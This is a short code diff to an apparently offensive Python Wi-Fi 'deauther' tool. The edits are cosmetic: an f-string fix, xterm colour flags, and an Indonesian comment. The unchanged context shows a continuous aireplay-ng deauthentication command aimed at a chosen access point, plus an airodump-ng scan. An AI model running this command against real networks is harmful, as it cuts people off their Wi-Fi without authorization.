@@ -17,7 +17,7 @@ SHORTCUT_PATH = "/usr/local/bin/deauther"
 def check_superuser():
     """Return True if running as root, otherwise exit program."""
     if os.geteuid() != 0:
-        print("{Fore.RED}[!] {Fore.WHITE}This tool must be run as root!")
+        print(f"{Fore.RED}[!] {Fore.WHITE}This tool must be run as root!")
         sys.exit(1)
     return True
 
@@ -52,7 +52,7 @@ def start_deauth(bssid, channel, iface):
     # place xterm at bottom-right using negative geometry offsets
     # ensure interface is on target channel, then run aireplay-ng deauth (continuous)
     set_channel(iface, channel)
-    cmd = ["xterm", "-geometry", "80x24-0-0", "-e", "bash", "-lc",
+    cmd = ["xterm", "-geometry", "80x24-0-0", "-fg", "red", "-bg", "black", "-e", "bash", "-lc",
            f"aireplay-ng -0 0 -a {bssid} {iface}"]
     p = None
     try:
@@ -85,7 +85,7 @@ def run_airodump_scan(iface):
     try:
         # buka xterm tanpa -hold biar ga nge-freeze quitting
         cmd = f"airodump-ng --write {base} --output-format csv {iface}"
-        # buka xterm di pojok kanan bawah (geometry: 100x30, offset negatif)
+        # buka xterm di pojok kanan bawah (geometry: 100x30, offset negatif) dengan warna teks merah
         subprocess.run(["xterm", "-geometry", "100x30-0-0", "-e", "bash", "-lc", cmd])
     except Exception as e:
         print(f"{Fore.RED}[!] {Fore.WHITE}Failed to launch airodump-ng: {e}")
